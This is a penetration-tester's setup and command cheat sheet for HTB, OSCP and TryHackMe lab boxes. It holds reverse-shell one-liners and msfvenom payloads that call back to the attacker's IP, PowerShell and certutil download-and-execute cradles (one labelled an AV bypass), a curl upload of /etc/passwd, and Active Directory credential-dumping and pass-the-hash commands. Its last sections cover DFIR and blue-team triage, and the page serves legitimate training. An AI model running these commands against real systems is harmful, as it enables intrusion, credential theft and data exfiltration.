# Pre-Engagement Kali Setup

Paste-and-fill workflow for every box, lab, or engagement. Set the variables once at the top, then copy commands from anywhere in the vault — or from Claret — without editing IPs or credentials.

---

## 1. Master Paste Block

Copy the whole block, fill in the quoted values, run it. Directory structure and `/etc/hosts` run automatically.

```bash
# ============================================================
# TARGET IDENTITY
# ============================================================
export BoxIP="10.10.11.x"
export BoxName="machinename"             # HTB machine name / lab hostname
export BoxPlatform="htb"                 # htb | offsec | thm | ctf
export Domain="DOMAIN.LOCAL"             # leave "" if not AD
export DCip="10.10.11.x"                # leave "" if not AD
export FQDN=""                           # DC FQDN — e.g. DC01.domain.local (AD only)
export OS=""                             # Linux | Windows | AD  (fill after port triage)

# ============================================================
# IDENTITY — fill as found during engagement
# ============================================================
export Username=""
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export AdminUser=""                      # privileged account (DA, local admin)
export Hash=""                           # full LM:NT pair — e.g. aad3b...:64f12c...
export NThash=""                         # NT half only (crackmapexec, evil-winrm, xfreerdp)
export AdminHash=""                      # admin/DA NT hash (separate from working NThash)

# ============================================================
# NETWORK — your side
# ============================================================
export LocalIP=$(ip a show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
# If tun0 absent, override: export LocalIP="192.168.45.x"
export Port="4444"                       # primary reverse shell listener
export TransferPort="4445"              # HTTP transfer server (python3 -m http.server $TransferPort)
export WebPort="80"                      # target web service port (change to 443/8080 as needed)
export URL=""                            # full target URL — e.g. http://$BoxIP/login
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"

# ============================================================
# RECON — fill these after the full TCP scan
# ============================================================
export OpenPorts=""                      # e.g. "22,80,443" — used in targeted nmap follow-up
export Product=""                        # service product name — e.g. Apache httpd, OpenSSH
export Version=""                        # product version — e.g. 2.4.49

# ============================================================
# EXPLOITATION — fill when you have a candidate
# ============================================================
export ExploitId=""                      # CVE or EDB number — e.g. CVE-2021-41773
export ExploitFile=""                    # local exploit path — e.g. exploits/50383.py

# ============================================================
# ACTIVE DIRECTORY — fill on AD boxes
# ============================================================
export CA=""                             # ADCS Certificate Authority hostname
export Template=""                       # ADCS cert template — e.g. User, Machine, SubCA
export ServiceName=""                    # Windows service name for privesc (sc qc $ServiceName)

# ============================================================
# FLAGS — fill when captured
# ============================================================
export UserFlag=""                       # user.txt / local.txt value
export RootFlag=""                       # root.txt / proof.txt value

# ============================================================
# WORKSPACE — runs automatically
# ============================================================
export BoxDir="$HOME/Platforms/HackTheBox/$BoxName"
mkdir -p "$BoxDir"/{nmap,recon,loot,exploits,www,screenshots}
# recon/ is an alias for nmap/ — Claret's attack-tree uses $BoxDir/recon/
ln -sfn "$BoxDir/nmap" "$BoxDir/recon" 2>/dev/null || true
cd "$BoxDir"

# /etc/hosts entry
[[ -n "$BoxName" && -n "$BoxIP" ]] && \
  echo "$BoxIP  $BoxName  ${BoxName}.${Domain}" | sudo tee -a /etc/hosts

# ============================================================
# CONFIRMATION
# ============================================================
echo ""
echo "  ┌─ BOX ──────────────────────────────────────────"
echo "  │  Name:      $BoxName  ($BoxIP)  [$BoxPlatform]"
echo "  │  Domain:    ${Domain:-—}  (DC: ${DCip:-—})"
echo "  │  FQDN:      ${FQDN:-—}"
echo "  │  OS:        ${OS:-not set}"
echo "  ├─ CREDS ────────────────────────────────────────"
echo "  │  User 1:    ${Username:-—} / ${Password:-—}"
echo "  │  User 2:    ${Username2:-—} / ${Password2:-—}"
echo "  │  User 3:    ${Username3:-—} / ${Password3:-—}"
echo "  │  Admin:     ${AdminUser:-—}"
echo "  │  Hash:      ${Hash:-none}"
echo "  │  NThash:    ${NThash:-none}"
echo "  │  AdminHash: ${AdminHash:-none}"
echo "  ├─ NETWORK ──────────────────────────────────────"
echo "  │  You:       $LocalIP"
echo "  │  Listener:  $Port  |  Transfer: $TransferPort"
echo "  │  Web:       $WebPort  |  URL: ${URL:-not set}"
echo "  │  Words:     $Wordlist"
echo "  ├─ RECON ────────────────────────────────────────"
echo "  │  OpenPorts: ${OpenPorts:-not set yet}"
echo "  │  Product:   ${Product:-—}  ${Version:-—}"
echo "  ├─ EXPLOIT ──────────────────────────────────────"
echo "  │  ExploitId: ${ExploitId:-—}"
echo "  │  File:      ${ExploitFile:-—}"
echo "  ├─ FLAGS ────────────────────────────────────────"
echo "  │  User:      ${UserFlag:-—}"
echo "  │  Root:      ${RootFlag:-—}"
echo "  └─ DIR ──────────────────────────────────────────"
echo "     $BoxDir"
echo ""
```

> 📸 `shot box-started` — red-box `BoxIP=` and `LocalIP=` values in the confirmation block

---

## 2. Updating Variables Mid-Box

Never `export` raw. Use `boxset` — it saves to `.env` and survives terminal restarts.

```bash
# ── After port triage ─────────────────────────────────────────
boxset OS Linux                          # or: Windows | AD
boxset OpenPorts "22,80,443"             # comma-separated — feeds nmap -sC -sV -p $OpenPorts

# ── After service fingerprint ─────────────────────────────────
boxset Product "Apache httpd"
boxset Version "2.4.49"

# ── After creds found ─────────────────────────────────────────
boxset Username sgage
boxset Password "Welcome1"
boxset Username2 sqlsvc
boxset Password2 "DB_passw0rd"

# ── After hash dump ───────────────────────────────────────────
boxset Hash "aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b"
boxset NThash "64f12cddaa88057e06a81b54e73b949b"
boxset AdminHash "<DA-NT-hash>"          # admin/DA hash — separate slot from NThash
boxset AdminUser "Administrator"

# ── After exploit selection ───────────────────────────────────
boxset ExploitId "CVE-2021-41773"
boxset ExploitFile "exploits/50383.py"

# ── On AD box ─────────────────────────────────────────────────
boxset FQDN "DC01.egotistical-bank.local"
boxset CA "CA01.domain.local"
boxset Template "User"

# ── On Windows privesc ────────────────────────────────────────
boxset ServiceName "VulnSvc"

# ── When flags drop ───────────────────────────────────────────
boxset UserFlag "d41d8cd98f00b204e9800998ecf8427e"
boxset RootFlag "098f6bcd4621d373cade4e832627b4f6"
loot flag user $UserFlag
loot flag root $RootFlag
```

---

## 3. Commands Using the Variables

### Recon

```bash
# Full TCP scan
sudo nmap -p- --min-rate 10000 -oA $BoxDir/nmap/${BoxName}_allports $BoxIP

# Targeted follow-up — run AFTER setting $OpenPorts
sudo nmap -sC -sV -p $OpenPorts -oA $BoxDir/nmap/${BoxName}_services $BoxIP

# UDP top 100
sudo nmap -sU --top-ports 100 -T4 -oA $BoxDir/nmap/${BoxName}_udp $BoxIP

# Web content discovery
feroxbuster -u http://$BoxIP:$WebPort/ -w $Wordlist \
  -x php,txt,html,aspx -t 40 -o $BoxDir/nmap/ferox.txt

# VHost / subdomain enum
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://$BoxIP -H "Host: FUZZ.$Domain" -fs 0

# Banner + tech fingerprint
curl -si http://$BoxIP:$WebPort/ | grep -iE 'server|x-powered|set-cookie|location'
whatweb http://$BoxIP:$WebPort/ -v
```

### Credential Testing

```bash
# SMB — password + hash
crackmapexec smb $BoxIP -u $Username -p $Password
crackmapexec smb $BoxIP -u $Username -H $NThash
crackmapexec smb $BoxIP -u $AdminUser -H $AdminHash    # admin slot

# WinRM
crackmapexec winrm $BoxIP -u $Username -p $Password
evil-winrm -i $BoxIP -u $Username -p $Password
evil-winrm -i $BoxIP -u $Username -H $NThash

# SSH
ssh $Username@$BoxIP

# Kerberos spray (lockout-safe, 1 attempt/account)
kerbrute passwordspray --dc $DCip -d $Domain users.txt $Password
```

### Shells & Payloads

```bash
# Listener
rlwrap nc -lvnp $Port

# msfvenom — Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f elf -o $BoxDir/www/shell.elf

# msfvenom — Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o $BoxDir/www/shell.exe

# msfvenom — Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o $BoxDir/www/meter.exe

# Bash callback (paste on target)
bash -i >& /dev/tcp/$LocalIP/$Port 0>&1

# PowerShell callback
powershell -nop -w hidden -e <base64>
IEX (New-Object Net.WebClient).DownloadString("http://$LocalIP:$TransferPort/Invoke-PowerShellTcp.ps1")
```

### File Transfer

```bash
# Start HTTP transfer server (always on $TransferPort, NOT $Port)
python3 -m http.server $TransferPort --directory $BoxDir/www

# Upload receiver (for target → attacker)
python3 -m uploadserver $TransferPort

# Download on target — Linux
wget http://$LocalIP:$TransferPort/linpeas.sh -O /tmp/linpeas.sh
curl http://$LocalIP:$TransferPort/linpeas.sh -o /tmp/linpeas.sh

# Download on target — Windows PowerShell
iwr http://$LocalIP:$TransferPort/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe
IEX (New-Object Net.WebClient).DownloadString("http://$LocalIP:$TransferPort/payload.ps1")

# Download on target — Windows certutil (AV bypass fallback)
certutil -urlcache -split -f http://$LocalIP:$TransferPort/file.exe C:\Windows\Temp\file.exe

# Download on target — Windows bitsadmin
bitsadmin /transfer job /download /priority normal http://$LocalIP:$TransferPort/file.exe C:\Windows\Temp\file.exe

# SCP pull from target
scp $Username@$BoxIP:/path/to/file $BoxDir/loot/

# Upload from target via HTTP POST
curl -F "file=@/etc/passwd" http://$LocalIP:$TransferPort/upload

# SMB share (Windows downloads without PowerShell)
impacket-smbserver share $BoxDir/www -smb2support
# On target: copy \\$LocalIP\share\file.exe .
```

### Active Directory

```bash
# User enumeration
GetADUsers.py -all $Domain/ -dc-ip $DCip
kerbrute userenum -d $Domain --dc $DCip /opt/jsmith.txt

# AS-REP roasting (no creds needed if pre-auth off)
GetNPUsers.py $Domain/ -dc-ip $DCip -request -no-pass -usersfile $BoxDir/loot/users.txt
# Crack: hashcat -m 18200 loot/asrep.hash /usr/share/wordlists/rockyou.txt

# Kerberoasting
GetUserSPNs.py -request -dc-ip $DCip $Domain/$Username:$Password
# Crack: hashcat -m 13100 loot/tgs.hash /usr/share/wordlists/rockyou.txt

# BloodHound collection
bloodhound-python -d $Domain -u $Username -p $Password -ns $DCip -c all
zip -r $BoxDir/loot/bh_$(date +%s).zip *.json && mv *.json $BoxDir/loot/

# DCSync (needs DS-Replication rights)
impacket-secretsdump -dc-ip $DCip -just-dc $Domain/$Username:$Password@$DCip
# After dump: boxset AdminHash <NT> && boxset NThash <NT>

# Pass-the-hash lateral movement
impacket-psexec $Domain/$AdminUser@$BoxIP -hashes :$AdminHash
impacket-wmiexec $Domain/$AdminUser@$BoxIP -hashes :$AdminHash
impacket-smbexec $Domain/$AdminUser@$BoxIP -hashes :$AdminHash

# Force-ChangePassword (AD abuse — needs GenericAll/ForceChangePassword edge)
net rpc password $Username -U "$Domain\\$AdminUser%$Password" -S $DCip

# Silver Ticket (needs target FQDN)
mimikatz # kerberos::golden /domain:$Domain /sid:<sid> /target:$FQDN /service:cifs /rc4:$AdminHash

# ADCS ESC1/ESC8
certipy req -u $Username@$Domain -p $Password -ca $CA -template $Template
ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp -smb2support   # ESC8 relay
```

### Remote Access

```bash
# WinRM
evil-winrm -i $BoxIP -u $Username -p $Password
evil-winrm -i $BoxIP -u $Username -H $NThash

# RDP
xfreerdp /v:$BoxIP /u:$Username /p:$Password /dynamic-resolution +clipboard
xfreerdp /v:$BoxIP /u:$Username /pth:$NThash /dynamic-resolution +clipboard   # PtH

# SSH
ssh $Username@$BoxIP
ssh -i $BoxDir/loot/id_rsa $Username@$BoxIP

# impacket suite
impacket-psexec  $Domain/$Username:$Password@$BoxIP
impacket-smbexec $Domain/$Username:$Password@$BoxIP
impacket-wmiexec $Domain/$Username:$Password@$BoxIP
```

### Windows Privilege Escalation

```bash
# Service enumeration
sc qc $ServiceName
sc query $ServiceName
icacls "C:\Path\To\$ServiceName.exe"

# WinPEAS (serve from $TransferPort)
certutil -urlcache -split -f http://$LocalIP:$TransferPort/winPEASx64.exe winpeas.exe
.\winpeas.exe quiet servicesinfo

# AlwaysInstallElevated MSI shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f msi -o $BoxDir/www/priv.msi
# On target: msiexec /quiet /qn /i priv.msi

# PowerShell history
type C:\Users\$Username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Linux Privilege Escalation

```bash
# LinPEAS (serve from $TransferPort)
curl -sL http://$LocalIP:$TransferPort/linpeas.sh | sh | tee /tmp/linpeas-$BoxName.txt

# sudo check (FIRST on every foothold)
sudo -l

# SUID check
find / -perm -4000 -type f 2>/dev/null

# Cron jobs
crontab -l; cat /etc/crontab; ls -la /etc/cron.*

# Writable paths
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v snap

# Background process watcher
pspy64 | tee /tmp/pspy-$BoxName.txt
```

### Flag Capture Habit

```bash
# Run this the moment a flag drops — before anything else
boxset UserFlag "<value>"
loot flag user $UserFlag
shot user-flag      # red-box the flag value

# Root/SYSTEM
boxset RootFlag "<value>"
loot flag root $RootFlag
shot root-flag      # red-box the flag value

# OSCP proof screenshot — all four in one frame
proof linux         # whoami + hostname + ip addr + cat /root/proof.txt
proof windows       # whoami + hostname + ipconfig + type proof.txt
```

---

## 4. Directory Structure

```
~/Platforms/HackTheBox/$BoxName/
├── nmap/           ← all nmap -oA output
├── recon/          ← symlink → nmap/ (Claret attack-tree uses $BoxDir/recon/)
├── loot/           ← hashes, creds, flags, BloodHound ZIPs, pcaps
├── exploits/       ← PoC scripts, modified exploits
├── www/            ← payloads served via python3 -m http.server $TransferPort
├── screenshots/    ← all shot() output
├── $BoxName.log    ← session recording (boxstart / htblog)
└── $BoxName.env    ← all exported variables (boxset writes here)
```

> `$BoxDir` is always `~/Platforms/HackTheBox/$BoxName` — every Claret command uses this path. If you use the manual paste block above instead of `boxstart`, the `$BoxDir` export is included so Claret commands resolve correctly.

---

## 5. Variable Quick-Reference

### Identity & Target

| Variable | What it holds | Example |
|---|---|---|
| `$BoxIP` | Target machine IP | `10.10.11.42` |
| `$BoxName` | Machine hostname | `sauna` |
| `$BoxPlatform` | Platform tag | `htb` / `offsec` / `thm` |
| `$BoxDir` | Full box working directory | `~/Platforms/HackTheBox/Sauna` |
| `$Domain` | AD domain FQDN | `EGOTISTICAL-BANK.LOCAL` |
| `$DCip` | Domain Controller IP | `10.10.11.42` |
| `$FQDN` | DC fully-qualified hostname | `DC01.egotistical-bank.local` |
| `$OS` | Target OS | `Linux` / `Windows` / `AD` |

### Credentials

| Variable | What it holds | Example |
|---|---|---|
| `$Username` | Primary working credential | `fsmith` |
| `$Password` | Primary working password | `Thestrokes23` |
| `$Username2` | Second cred set | `hsmith` |
| `$Password2` | Second password | `Password1` |
| `$Username3` | Third cred set | `svc_loanmgr` |
| `$Password3` | Third password | `Moneymakestheworldgoround!` |
| `$AdminUser` | Privileged account (DA / local admin) | `Administrator` |
| `$Hash` | Full LM:NT pair | `aad3b...:64f12c...` |
| `$NThash` | NT half only — for most PtH tools | `64f12cddaa88057e...` |
| `$AdminHash` | Admin/DA NT hash — separate slot | `e4e5b...` |

> Most Impacket tools want `-hashes LM:NT` (use `$Hash`). crackmapexec, evil-winrm, xfreerdp want just the NT half (use `$NThash` or `$AdminHash`). The LM half is almost always `aad3b435b51404eeaad3b435b51404ee`.

### Network

| Variable | What it holds | Example |
|---|---|---|
| `$LocalIP` | Your attack IP (tun0) | `10.10.16.5` |
| `$Port` | Reverse shell listener | `4444` |
| `$TransferPort` | HTTP transfer server port | `4445` |
| `$WebPort` | Target web service port | `80` / `443` / `8080` |
| `$URL` | Full target URL | `http://$BoxIP/login.php` |
| `$Wordlist` | Active wordlist path | `/usr/share/seclists/...` |

> `$TransferPort` is what Claret uses for ALL file transfer commands. The old `$Port2` name is retired — rename to `$TransferPort` in any existing `.env` files.

### Recon & Exploitation

| Variable | What it holds | Example |
|---|---|---|
| `$OpenPorts` | Open ports after full TCP scan | `"22,80,443,8080"` |
| `$Product` | Service product name | `Apache httpd` |
| `$Version` | Product version | `2.4.49` |
| `$ExploitId` | CVE or EDB number | `CVE-2021-41773` |
| `$ExploitFile` | Local exploit path | `exploits/50383.py` |

### Active Directory & Privesc

| Variable | What it holds | Example |
|---|---|---|
| `$CA` | ADCS Certificate Authority | `CA01.domain.local` |
| `$Template` | ADCS cert template | `User` / `Machine` |
| `$ServiceName` | Windows service name | `VulnSvc` |

### Flags

| Variable | What it holds | Example |
|---|---|---|
| `$UserFlag` | user.txt / local.txt value | `d41d8cd98f00...` |
| `$RootFlag` | root.txt / proof.txt value | `098f6bcd4621...` |

---

## 6. Platform-Specific Notes

### HTB Offensive

- `boxstart <Name> <IP> htb`
- Flags: `user.txt` (home dir) and `root.txt` (`/root/`)
- Proof screenshot: `whoami` + `hostname` + `ip addr` + `cat /root/root.txt` in one frame

### OffSec / OSCP / Proving Grounds

- `boxstart <Name> <IP> offsec`
- Flags: `local.txt` (low priv) and `proof.txt` (root/SYSTEM)
- Exam proof: `whoami` + `hostname` + `ip addr` + `cat /root/proof.txt` — all four visible, one frame
- AD exam: also capture `network-secret.txt` — `boxset RootFlag <network-secret-value>`
- PG paths may differ: `C:\Users\<user>\Desktop\local.txt`, `C:\Users\Administrator\Desktop\proof.txt`

### TryHackMe

- `boxstart <Name> <IP> thm`
- VPN on `tun0` same as HTB
- Flags are often shown in the task answers panel, not just on disk

---

## 7. Sherlock / DFIR Setup

Sherlock challenges have no target IP and no reverse shell. You receive artefact files and answer questions. Different workflow.

```bash
# Start a Sherlock investigation
sherlockstart <Name> <CaseType>
# e.g.: sherlockstart Bumblebee evtx
# CaseType: memory | disk | pcap | evtx | mixed

# Variables set by sherlockstart:
export SherlockName="Bumblebee"
export SherlockDir="$HOME/Platforms/HackTheBox/Sherlocks/$SherlockName"
export ArtifactPath="$SherlockDir/artefacts"
export CaseType="evtx"

# Set after loading artefacts
sherlockset VolProfile "Win10x64_19041"  # after: vol3 -f mem.bin windows.info
sherlockset MemPath "$ArtifactPath/mem.vmem"
sherlockset PcapPath "$ArtifactPath/capture.pcapng"
sherlockset EvtxPath "$ArtifactPath/evtx"
```

### Sherlock Directory Structure

```
~/Platforms/HackTheBox/Sherlocks/$SherlockName/
├── artefacts/      ← drop challenge files here, hash before touching
├── timeline/       ← chainsaw / hayabusa CSV output
├── findings/       ← IOC lists, notes
├── screenshots/
└── $SherlockName.env
```

### Sherlock Loot Commands

```bash
loot ioc   ip 10.10.1.5                          # indicator of compromise
loot ioc   hash abc123def456                     # file hash IOC
loot ioc   domain evil.com                       # domain IOC
loot finding "PowerShell ran encoded payload at 14:32 via PID 4892"
loot answer 3 "evil-winrm"                       # HTB Sherlock Q&A answer
loot event  "2023-03-14T14:32:11" "PID 4892 spawned cmd.exe under svchost"
```

### Sherlock Screenshots

| When | Command | Red-box |
|---|---|---|
| After sherlockstart | `shot case-started` | SherlockName, CaseType |
| After hashing artefacts | `shot artefact-hashes` | SHA256 of each artefact |
| Key event found | `shot finding-<n>` | The specific event line |
| Timeline window | `shot timeline-<stage>` | Relevant timestamp range |
| Answer confirmed | `shot answer-<n>` | The answer value |

### Common Sherlock Commands

```bash
# Hash all artefacts first (integrity baseline)
sha256sum $ArtifactPath/* | tee $SherlockDir/findings/hashes.txt

# Chainsaw — triage all EVTXs in one pass
chainsaw hunt $ArtifactPath/evtx -s /opt/chainsaw/sigma/ --mapping /opt/chainsaw/mappings/sigma-event-logs-all.yml -o $SherlockDir/timeline/chainsaw.csv

# Hayabusa — CSV timeline
hayabusa csv-timeline -d $ArtifactPath/evtx -o $SherlockDir/timeline/hayabusa.csv

# Volatility — memory analysis
vol3 -f $ArtifactPath/mem.vmem windows.info       # get OS/profile
vol3 -f $ArtifactPath/mem.vmem windows.pslist
vol3 -f $ArtifactPath/mem.vmem windows.netscan | grep ESTABLISHED
vol3 -f $ArtifactPath/mem.vmem windows.cmdline
vol3 -f $ArtifactPath/mem.vmem windows.malfind

# Wireshark CLI — key filters
tshark -r $ArtifactPath/capture.pcap -Y "http.request.method == POST" -T fields -e ip.src -e http.host -e http.request.uri
tshark -r $ArtifactPath/capture.pcap -Y "dns" -T fields -e ip.src -e dns.qry.name | sort | uniq -c | sort -rn
tshark -r $ArtifactPath/capture.pcap -Y "kerberos.msg_type == 13" -T fields -e ip.src -e kerberos.CNameString
```

---

## 8. Blue Team / Defensive Setup

Blue team labs (OffSec Blue, SOC scenarios) use the same `$BoxIP` and `$BoxDir` variables. Run a standard `boxstart` then set the extra blue-specific vars:

```bash
boxstart Endpoint1 10.10.5.20 offsec-blue

# Extra vars for blue work
boxset LogPath "$BoxDir/loot/evtx"
boxset VolPath "$BoxDir/loot/memory"
boxset RuleFile "$BoxDir/loot/yara/rules.yar"
boxset BaselineFile "$BoxDir/loot/baseline.txt"

# Create blue subdirs (in addition to boxstart defaults)
mkdir -p "$BoxDir/loot"/{evtx,pcaps,memory,artefacts,yara}
```

### Blue Team Loot Commands

```bash
# Hash before touching
sha256sum $BoxDir/loot/artefacts/suspicious.exe | tee $BoxDir/loot/hashes.txt

# KAPE triage collection (on Windows target via WinRM/RDP)
kape.exe --tsource C: --tdest $BoxDir/loot/kape-out --target KapeTriage,EventLogs --module Hayabusa

# Memory acquisition (Linux target)
sudo dd if=/dev/mem bs=1M of=$BoxDir/loot/memory/memory.raw 2>/dev/null
# or LiME: insmod lime.ko path=$BoxDir/loot/memory/memory.lime format=lime

# Live network capture (5 min)
sudo tcpdump -i eth0 -w $BoxDir/loot/pcaps/capture.pcap -G 300 -W 1

# YARA scan
yara -r $RuleFile $BoxDir/loot/artefacts/ 2>/dev/null
```

---

## 9. Bash Variable Syntax — Gotchas

```bash
# Fine — space or punctuation after the variable
ssh $Username@$BoxIP
echo "Host: $BoxIP"

# Needs braces — text immediately follows the variable name
echo "${BoxName}admin"          # → machinameadmin (NOT $BoxNameadmin)
echo "nmap/${BoxName}_all"      # → nmap/machinename_all ✓

# Default-value substitution
echo "${Hash:-none set}"        # prints "none set" if Hash is empty
echo "${OS:-unknown}"

# Quoting passwords with special characters
evil-winrm -i $BoxIP -u $Username -p "$Password"    # always quote $Password
smbclient //$BoxIP/share -U "$Username%$Password"
```

---

## 10. /etc/hosts Hygiene

```bash
# Check current entries for this box
grep "$BoxName\|$BoxIP" /etc/hosts

# Clean up at end of session (before next box)
sudo sed -i "/$BoxIP/d" /etc/hosts
sudo sed -i "/$BoxName/d" /etc/hosts
```

> Stale `/etc/hosts` entries from earlier boxes cause silent failures — vhost mismatches, unexpected 200s from old IPs. Run the cleanup before every new box.

---

## 11. Platform Differences at a Glance

| | HTB Offensive | OffSec / OSCP | TryHackMe | Sherlock | Blue Team |
|---|---|---|---|---|---|
| `boxstart` tag | `htb` | `offsec` | `thm` | `sherlockstart` | `offsec-blue` |
| Your IP source | tun0 | tun0 / eth0 | tun0 | N/A | eth0 |
| User flag | `user.txt` | `local.txt` | task panel | Q&A answer | N/A |
| Root flag | `root.txt` | `proof.txt` | task panel | Q&A answer | N/A |
| Proof format | `whoami`+`hostname`+`ip a`+flag | same + `hostname` | task panel | answer text | findings report |
| Key extra var | — | `$RootFlag` for `proof.txt` | — | `$ArtifactPath` | `$LogPath` |

---

## 12. Why This Works

Every command in the vault — and every command in Claret — is written against these variable names. Set them once at box start and copy-paste speed goes up by an order of magnitude. Under exam time pressure this is the difference between spending 20 seconds on a command and spending 2.

**Variable → Claret mapping:** `$TransferPort` feeds every Claret file-transfer snippet. `$OpenPorts` feeds the targeted nmap follow-up in the attack tree. `$AdminUser` + `$AdminHash` feed AD abuse chains. `$CA` + `$Template` feed ADCS ESC commands. `$ExploitId` + `$ExploitFile` feed the vuln-exploit map. `$FQDN` feeds Silver Ticket and the AD trust graph.

---

#### Tags: #PreEngagement #Setup #Variables #KaliSetup #Methodology #BoxSetup #Workflow #Sherlock #BlueTeam

## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[OSCP/MODULES/06. Information Gathering]] — module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] — demonstrates the workflow described here

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
